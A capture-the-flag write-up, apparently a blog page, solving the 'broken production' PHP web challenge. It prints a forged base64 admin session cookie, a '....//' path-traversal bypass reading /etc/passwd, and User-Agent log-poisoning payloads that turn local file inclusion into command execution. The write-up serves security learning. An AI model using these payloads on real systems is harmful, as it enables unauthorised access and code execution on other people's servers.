<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">14</span>    charset utf-8;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">15</span>    keepalive_timeout 20s;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">16</span>    sendfile on;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">17</span>    tcp_nopush on;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">18</span>    client_max_body_size 1M;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">19</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">20</span>    include /etc/nginx/mime.types;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">21</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">22</span>    server {
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">23</span>        listen 80;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">24</span>        server_name _;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">25</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">26</span>        index index.php;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">27</span>        root /www;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">28</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">29</span>        location / {
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">30</span>            try_files $uri $uri/ /index.php?$query_string;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">31</span>            location ~ \.php$ {
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">32</span>                try_files $uri =404;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">33</span>                fastcgi_pass unix:/run/php-fpm.sock;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">34</span>                fastcgi_index index.php;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">35</span>                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">36</span>                include fastcgi_params;
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">37</span>            }
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">38</span>        }
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">39</span>    }
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">40</span>}</code></pre></div></div>
<p>(indeed, one of the tabs in the admin dashboard lets you view this file directly:)</p>
<p><img src="https://gist.github.com/user-attachments/assets/8b97dde8-7959-4917-94b3-11134e06b4e0" alt="image"/></p>
<p>Thus, we can write arbitrary PHP code to the log file by manipulating the HTTP user agent, and then include this file via LFI for RCE:</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (js)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">&#x27;http://94.237.53.57:54572/&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">    </span><span class="token literal-property property">headers</span><span class="token operator">:</span><span class=""> </span><span class="token punctuation">{</span><span class=""> </span><span class="token string-property property">&#x27;User-Agent&#x27;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span><span class=""> </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div></div>
<p>(which requires Firefox, since Chromium <a href="https://stackoverflow.com/questions/42815087/sending-a-custom-user-agent-string-along-with-my-headers-fetch">disallows setting a custom user agent in <code class="opacity-75 bg-black/30 rounded p-1">fetch</code></a>).</p>
<p><img src="https://gist.github.com/user-attachments/assets/06c166c3-9cb5-4b40-bc71-7f61370715d7" alt="image"/></p>
<p>We can use the RCE to give us the flag file name with e.g.</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (js)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token dom variable">window</span><span class="token punctuation">.</span><span class="token property-access">location</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">    </span><span class="token literal-property property">headers</span><span class="token operator">:</span><span class=""> </span><span class="token punctuation">{</span><span class=""> </span><span class="token string-property property">&#x27;User-Agent&#x27;</span><span class="token operator">:</span><span class=""> </span><span class="token string">&#x27;&lt;?php echo `ls /`; ?&gt;&#x27;</span><span class=""> </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span></code></pre></div></div>
<p>and include it with LFI to get the flag:</p>
<p><img src="https://gist.github.com/user-attachments/assets/31b2d71e-38b9-4918-88ca-ce230ee4d59b" alt="image"/></p></main></div><!--$--><!--/$--><!--$--><!--/$--></main><script src="/_next/static/chunks/webpack-50d183473e3f8178.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[87555,[],\"\"]\n3:I[31295,[],\"\"]\n4:I[6874,[\"874\",\"static/chunks/874-c62c375efd21db20.js\",\"633\",\"static/chunks/app/writeups/%5Bid%5D/layout-0f792473045deceb.js\"],\"\"]\n6:I[59665,[],\"MetadataBoundary\"]\n8:I[59665,[],\"OutletBoundary\"]\nb:I[74911,[],\"AsyncMetadataOutlet\"]\nd:I[59665,[],\"ViewportBoundary\"]\nf:I[26614,[],\"\"]\n:HL[\"/_next/static/media/e4af272ccee01ff0-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/da257a7bf05e11ce.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"4_bAk8K-NXO9_BWRG47Kd\",\"p\":\"\",\"c\":[\"\",\"writeups\",\"55b783ecf750b20dfd3d58cf58530ecd\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"writeups\",{\"children\":[[\"id\",\"55b783ecf750b20dfd3d58cf58530ecd\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/da257a7bf05e11ce.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"dark scroll-smooth\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}]}],[\"$\",\"body\",null,{\"className\":\"text-dark dark:text-white dark:bg-midnight\",\"style\":{\"fontFamily\":\"'Inter', 'Inter Fallback'\",\"fontStyle\":\"normal\"},\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"div\",null,{\"className\":\"h-screen flex items-center justify-center\",\"children\":[\"$\",\"main\",null,{\"className\":\"relative pl-14\",\"children\":[[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"viewBox\":\"0 0 512 512\",\"className\":\"absolute left-0 top-2 text-5xl text-grapefruit\",\"children\":[\"$undefined\",[[\"$\",\"path\",\"0\",{\"d\":\"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z\",\"children\":\"$undefined\"}]]],\"style\":{\"color\":\"$undefined\"},\"height\":\"1em\",\"width\":\"1em\",\"xmlns\":\"http://www.w3.org/2000/svg\"}],[\"$\",\"h1\",null,{\"className\":\"font-bold text-7xl underline decoration-grapefruit mb-5\",\"children\":\"404.\"}],[\"$\",\"p\",null,{\"children\":\"Your requested page was not found.\"}],[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"font-medium text-inherit\",\"children\":\"Return to home →\"}]]}]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}]]}],{\"children\":[\"writeups\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"main\",null,{\"className\":\"container pt-20 pb-24\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}],{\"children\":[[\"id\",\"55b783ecf750b20dfd3d58cf58530ecd\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[[\"$\",\"$L4\",null,{\"href\":\"/writeups\",\"className\":\"text-secondary text-sm mb-10 -ml-5 block w-max\",\"children\":\"← Back to writeups\"}],[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L5\",[\"$\",\"$L6\",null,{\"children\":\"$L7\"}],null,[\"$\",\"$L8\",null,{\"children\":[\"$L9\",\"$La\",[\"$\",\"$Lb\",null,{\"promise\":\"$@c\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"wJB0aHqnxfLPnw8ep2mNz\",{\"children\":[[\"$\",\"$Ld\",null,{\"children\":\"$Le\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],null]}],false]],\"m\":\"$undefined\",\"G\":[\"$f\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"10:\"$Sreact.suspense\"\n11:I[74911,[],\"AsyncMetadata\"]\n7:[\"$\",\"$10\",null,{\"fallback\":null,\"children\":[\"$\",\"$L11\",null,{\"promise\":\"$@12\"}]}]\n"])</script><script>self.__next_f.push([1,"a:null\n"])</script><script>self.__next_f.push([1,"e:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n9:null\n"])</script><script>self.__next_f.push([1,"13:I[50674,[\"325\",\"static/chunks/325-8cc74193b249521f.js\",\"134\",\"static/chunks/app/writeups/%5Bid%5D/page-d2275216898ea7fa.js\"],\"default\"]\n14:T73d,\u003c?php\nspl_autoload_register(function ($name){\n    if (preg_match('/Controller$/', $name))\n    {\n        $name = \"controllers/${name}\";\n    }\n    else if (preg_match('/Model$/', $name))\n    {\n        $name = \"models/${name}\";\n    }\n    include_once \"${name}.php\";\n});\n\n$session  = new SessionHandler();\n$database = new Database('/tmp/challenge.db');\n\n$router = new Router();\n$router-\u003enew('GET', '/', function($router) use ($session){\n    if (!$session-\u003eisLoggedIn()) \n    {\n        return header('location: /login');\n    }\n\n    return $router-\u003eview('index', ['admin' =\u003e $session-\u003eisAdmin(), 'username' =\u003e $session-\u003egetUsername()]);\n});\n\n$router-\u003enew('GET', '/login', function($router)  use ($session){\n    if ($session-\u003eisLoggedIn()) \n    {\n        return header('location: /');\n    }\n\n    return $router-\u003eview('login');\n});\n\n$router-\u003enew('GET', '/register', function($router)  use ($session){\n    if ($session-\u003eisLoggedIn()) \n    {\n        return header('location: /');\n    }\n\n    return $router-\u003eview('register');\n});\n\n$router-\u003enew('POST', '/auth/login', function($router) use ($database, $session){\n    $user = $database-\u003elogin($_POST['username'], $_POST['password']);\n    if (!$user) return header('location: /login?msg=Invalid username or password!');\n    $session-\u003elogin($_POST['username']);\n    header('location: /');\n    exit;\n});\n\n$router-\u003enew('POST', '/auth/register', function($router)  use ($database){\n    if ($_POST['username'] === 'admin') return header('location: /register?msg=This user already exists!');\n    $database-\u003eregister($_POST['username'], $_POST['password']);\n    header('location: /login?msg=The account registered successfully!\u0026reg=true');\n    exit;\n});\n\n\n$router-\u003enew('GET', '/logout', function($router)  use ($session){\n    \n    $session-\u003edistroy();\n    return header('location: /login');\n    \n});\n\n\ndie($router-\u003ematch());15:Tacb,"])</script><script>self.__next_f.push([1,"\u003c?php\n\n$utilFile = \"tickets.php\";\n\nif (isset($_GET['util']))\n\t$utilFile = $_GET['util'];\n\t$utilFile = str_replace(\"../\",\"\", $utilFile);\n\n$fullPath = '/www/utils/'.$utilFile;\n\n?\u003e\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n\t\u003ctitle\u003eBroken Production\u003c/title\u003e\n\t\u003cmeta charset=\"UTF-8\"\u003e\n\t\u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e\n\u003c!-- ... --\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\t\n\t\u003cbody\u003e\n    \u003cdiv id=\"wrapper\"\u003e\n        \u003c!-- Sidebar --\u003e\n        \u003cdiv id=\"sidebar-wrapper\"\u003e\n            \u003cul class=\"sidebar-nav\"\u003e\n                \u003cli class=\"sidebar-brand\"\u003e\n                    \u003ca href=\"#\"\u003e\n                        Admin Dashboard (Under Construction)\n                    \u003c/a\u003e\n                \u003c/li\u003e\n                \u003cdiv class=\"profile-sidebar\"\u003e\n                    \u003c!-- SIDEBAR USERPIC --\u003e\n                    \u003cdiv class=\"profile-userpic\"\u003e\n                        \u003cimg src=\"/static/images/makelaris.png\" class=\"img-responsive\" alt=\"\"\u003e\n                    \u003c/div\u003e\n                    \u003c!-- END SIDEBAR USERPIC --\u003e\n                    \u003c!-- SIDEBAR USER TITLE --\u003e\n                    \u003cdiv class=\"profile-usertitle\"\u003e\n                        \u003cdiv class=\"profile-usertitle-name\"\u003e\n                            \u003c?php echo $username ?\u003e\n                        \u003c/div\u003e\n                        \u003cdiv class=\"profile-usertitle-job\"\u003e\n                            Administrator\n                        \u003c/div\u003e\n                    \u003c/div\u003e\n                    \u003c!-- END SIDEBAR USER TITLE --\u003e\n                    \u003c!-- SIDEBAR BUTTONS --\u003e\n                    \u003cdiv class=\"profile-userbuttons\"\u003e\n                        \u003ca href=\"/logout\" class=\"btn btn-danger btn-xs\"\u003eLog Out\u003c/a\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n            \u003c/ul\u003e\n        \u003c/div\u003e\n        \u003c!-- /#sidebar-wrapper --\u003e\n\n        \u003c!-- Page Content --\u003e\n        \u003cdiv id=\"page-content-wrapper\"\u003e\n\n            \u003cdiv class=\"container-fluid\"\u003e\n                \u003cdiv class=\"row text-right mb-4\"\u003e\n\t                \u003cdiv class=\"col\"\u003e\n\t                    \u003cselect class=\"custom-select\" id=\"gotoPage\"\u003e\n\t                    \t\u003c?php \n\t                    \t\techo \"\u003coption value='$utilFile' selected='true'\u003e$utilFile\u003c/option\u003e\";\n\n\t                    \t\t$pages = array(\"logs.php\", \"tickets.php\", \"todo.php\");\n\t                    \t\tforeach ($pages as $page){\n\t                    \t\t\tif($page != $utilFile){\n\t                    \t\t\t\techo \"\u003coption value='$page'\u003e$page\u003c/option\u003e\";\n\t                    \t\t\t}\n\t                    \t\t}\n\t                    \t?\u003e\n\t\t\t\t\t\t\u003c/select\u003e  \n\t                \u003c/div\u003e    \n\t            \u003c/div\u003e\n\n                \u003cdiv class=\"manage-box\"\u003e\n                \t\u003c?php include_once($fullPath); ?\u003e\n                \u003c/div\u003e\n            \u003c/div\u003e\n        \u003c/div\u003e\n        \u003c!-- /#page-content-wrapper --\u003e\n\n    \u003c/div\u003e\n\u003c/body\u003e\n\u003c!-- ... --\u003e\n\n\u003c/html\u003e"])</script><script>self.__next_f.push([1,"5:[\"$\",\"div\",null,{\"children\":[\"$\",\"main\",null,{\"className\":\"text-pretty max-w-5xl mx-auto text-sm [\u0026_h1]:text-5xl [\u0026_h1]:font-semibold [\u0026_h1]:mb-8 [\u0026_blockquote]:text-secondary [\u0026_blockquote]:space-y-3 [\u0026_blockquote]:border-l-4 [\u0026_blockquote]:border-secondary [\u0026_blockquote]:pl-5 [\u0026_blockquote]:mb-5 [\u0026\u003e_p]:my-3 [\u0026_img]:my-5 [\u0026_ul]:list-disc [\u0026_ul]:pl-6 [\u0026_ol]:list-decimal [\u0026_ol]:pl-6 [\u0026_img]:rounded [\u0026_li]:my-2\",\"children\":[[\"$\",\"h1\",\"h1-0\",{\"children\":\"Hack the Madness CTF Round 2 — broken production\"}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-0\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server.\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"We're given a PHP server that looks like this:\"}],\"\\n\",[\"$\",\"$L13\",\"pre-0\",{\"className\":\"my-4\",\"children\":\"$14\",\"language\":\"php\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"Looking in \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded p-1\",\"children\":\"views/index.php\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"opacity-75 bg-black/30 rounded p-1\",\"children\":\"SessionHandler.php\"}],\",\"]}],\"\\n\",[\"$\",\"$L13\",\"pre-1\",{\"className\":\"my-4\",\"children\":\"\u003c?php if ($admin){\\n\\t\\tinclude_once \\\"admin.php\\\";\\n\\t} else{\\n\\t\\tinclude_once \\\"user.php\\\";\\n\\t}\\n?\u003e\",\"language\":\"php\"}],\"\\n\",[\"$\",\"$L13\",\"pre-2\",{\"className\":\"my-4\",\"children\":\"\u003c?php\\nclass SessionHandler\\n{\\n    public function __construct()\\n    {\\n        if (!empty($_COOKIE['PHPSESSID'])){\\n            $this-\u003ecookie = $_COOKIE['PHPSESSID'];\\n            $this-\u003eload();\\n        }\\n    }\\n\\n    public function login($username)\\n    {\\n        setcookie('PHPSESSID', base64_encode(json_encode([\\n            'username' =\u003e $username\\n        ])), time()+1333337, '/');\\n    }\\n\\n    public function load()\\n    {\\n        $this-\u003edata = json_decode(base64_decode($this-\u003ecookie));\\n    }\\n\\n    public function isLoggedIn()\\n    {\\n        return !is_null($this-\u003edata-\u003eusername);\\n    }\\n\\n    public function isAdmin()\\n    {\\n        return $this-\u003edata-\u003eusername === 'admin';\\n    }\\n\\n    public function getUsername()\\n    {\\n        return $this-\u003edata-\u003eusername;\\n    }\\n\\n    public function distroy()\\n    {\\n        unset($_COOKIE['PHPSESSID']);\\n        setcookie('PHPSESSID', '', time() - 3600, '/');\\n    }\\n}\",\"language\":\"php\"}],\"\\n\",[\"$\",\"p\",\"p-2\",{\"children\":[\"it seems we can pretty easily log in as admin by base64 encoding the string \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded p-1\",\"children\":\"{\\\"username\\\":\\\"admin\\\"}\"}],\", e.g. something like\"]}],\"\\n\",[\"$\",\"$L13\",\"pre-3\",{\"className\":\"my-4\",\"children\":\"ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ\",\"language\":\"$undefined\"}],\"\\n\",[\"$\",\"p\",\"p-3\",{\"children\":[\"Replacing our \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded p-1\",\"children\":\"PHPSESSID\"}],\" cookie with that, we get to the admin dashboard:\"]}],\"\\n\",[\"$\",\"p\",\"p-4\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/41a17715-eea8-447d-9909-ff31140957f5\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-5\",{\"children\":\"Looking at the admin view,\"}],\"\\n\",[\"$\",\"$L13\",\"pre-4\",{\"className\":\"my-4\",\"children\":\"$15\",\"language\":\"php\"}],\"\\n\",[\"$\",\"p\",\"p-6\",{\"children\":[\"it looks like we get local file inclusion, but with path traversal blocked by a \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded p-1\",\"children\":\"str_replace\"}],\".\"]}],\"\\n\",[\"$\",\"p\",\"p-7\",{\"children\":[\"However, we can very easily get around this filter by passing a query param such as \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded p-1\",\"children\":\"....//....//etc/passwd\"}],\": the script will delete every instance of \",[\"$\",\"code\",\"code-1\",{\"className\":\"opacity-75 bg-black/30 rounded p-1\",\"children\":\"../\"}],\", leaving us with a file inclusion of \",[\"$\",\"code\",\"code-2\",{\"className\":\"opacity-75 bg-black/30 rounded p-1\",\"children\":\"/var/www/../../etc/passwd\"}],\".\"]}],\"\\n\",[\"$\",\"p\",\"p-8\",{\"children\":\"We still can't directly include the flag, though; looking at the dockerfile, the flag file's name is randomly generated at build time.\"}],\"\\n\",[\"$\",\"$L13\",\"pre-5\",{\"className\":\"my-4\",\"children\":\"FROM alpine:edge\\n\\n# Setup usr\\nRUN adduser -D -u 1000 -g 1000 -s /bin/sh www\\n\\n# Install system packages\\nRUN apk add --no-cache --update supervisor nginx php7-fpm php7-sqlite3 php7-json\\n\\n# Configure php-fpm and nginx\\nCOPY config/fpm.conf /etc/php7/php-fpm.d/www.conf\\nCOPY config/supervisord.conf /etc/supervisord.conf\\nCOPY config/nginx.conf /etc/nginx/nginx.conf\\n\\n# Copy challenge files\\nCOPY challenge /www\\n\\n# Copy flag\\nRUN RND=$(echo $RANDOM | md5sum | head -c 15) \u0026\u0026 \\\\\\n\\techo \\\"HTB{f4k3_fl4g_f0r_t3st1ng}\\\" \u003e /flag_${RND}.txt\\n\\n# Setup permissions\\nRUN chown -R www:www /var/lib/nginx\\n\\n# Expose the port nginx is listening on\\nEXPOSE 80\\n\\nCMD /usr/bin/supervisord -c /etc/supervisord.conf\",\"language\":\"Dockerfile\"}],\"\\n\",[\"$\",\"p\",\"p-9\",{\"children\":[\"Then, we can try to get RCE instead. Looking at the nginx config, we can see\\nthat the server logs requests to \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded p-1\",\"children\":\"/var/log/nginx/access.log\"}],\":\"]}],\"\\n\",[\"$\",\"$L13\",\"pre-6\",{\"className\":\"my-4\",\"children\":\"user www;\\npid /run/nginx.pid;\\nerror_log /dev/stderr info;\\n\\nevents {\\n    worker_connections 1024;\\n}\\n\\nhttp {\\n    server_tokens off;\\n    log_format docker '$remote_addr $remote_user $status \\\"$request\\\" \\\"$http_referer\\\" \\\"$http_user_agent\\\" ';\\n    access_log /var/log/nginx/access.log docker;\\n\\n    charset utf-8;\\n    keepalive_timeout 20s;\\n    sendfile on;\\n    tcp_nopush on;\\n    client_max_body_size 1M;\\n\\n    include /etc/nginx/mime.types;\\n\\n    server {\\n        listen 80;\\n        server_name _;\\n\\n        index index.php;\\n        root /www;\\n\\n        location / {\\n            try_files $uri $uri/ /index.php?$query_string;\\n            location ~ \\\\.php$ {\\n                try_files $uri =404;\\n                fastcgi_pass unix:/run/php-fpm.sock;\\n                fastcgi_index index.php;\\n                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\\n                include fastcgi_params;\\n            }\\n        }\\n    }\\n}\",\"language\":\"conf\"}],\"\\n\",[\"$\",\"p\",\"p-10\",{\"children\":\"(indeed, one of the tabs in the admin dashboard lets you view this file directly:)\"}],\"\\n\",[\"$\",\"p\",\"p-11\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/8b97dde8-7959-4917-94b3-11134e06b4e0\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-12\",{\"children\":\"Thus, we can write arbitrary PHP code to the log file by manipulating the HTTP user agent, and then include this file via LFI for RCE:\"}],\"\\n\",[\"$\",\"$L13\",\"pre-7\",{\"className\":\"my-4\",\"children\":\"await (await fetch('http://94.237.53.57:54572/', {\\n    headers: { 'User-Agent': '\u003c?php phpinfo(); ?\u003e' }\\n})).text()\",\"language\":\"js\"}],\"\\n\",[\"$\",\"p\",\"p-13\",{\"children\":[\"(which requires Firefox, since Chromium \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://stackoverflow.com/questions/42815087/sending-a-custom-user-agent-string-along-with-my-headers-fetch\",\"children\":[\"disallows setting a custom user agent in \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded p-1\",\"children\":\"fetch\"}]]}],\").\"]}],\"\\n\",[\"$\",\"p\",\"p-14\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/06c166c3-9cb5-4b40-bc71-7f61370715d7\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-15\",{\"children\":\"We can use the RCE to give us the flag file name with e.g.\"}],\"\\n\",[\"$\",\"$L13\",\"pre-8\",{\"className\":\"my-4\",\"children\":\"await (await fetch(window.location, {\\n    headers: { 'User-Agent': '\u003c?php echo `ls /`; ?\u003e' }\\n})).text() \",\"language\":\"js\"}],\"\\n\",[\"$\",\"p\",\"p-16\",{\"children\":\"and include it with LFI to get the flag:\"}],\"\\n\",[\"$\",\"p\",\"p-17\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/31b2d71e-38b9-4918-88ca-ce230ee4d59b\",\"alt\":\"image\"}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"12:{\"metadata\":[[\"$\",\"title\",\"0\",{\"children\":\"Hack the Madness CTF Round 2 — broken production | kevin.fish\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for 